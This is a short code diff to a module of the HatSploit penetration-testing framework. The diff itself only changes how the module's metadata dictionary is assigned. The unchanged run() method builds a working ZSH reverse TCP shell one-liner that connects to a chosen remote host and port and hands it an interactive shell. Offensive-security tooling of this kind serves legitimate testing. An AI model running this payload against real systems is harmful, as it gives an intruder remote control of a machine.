@@ -10,7 +10,7 @@ class HatSploitPayload(Payload):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "ZSH shell Reverse TCP",
             'Payload': "unix/generic/zsh_reverse_tcp",
             'Authors': [
@@ -21,7 +21,7 @@ class HatSploitPayload(Payload):
             'Platform': "unix",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
     def run(self):
         payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {self.rhost.value} {self.rport.value} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
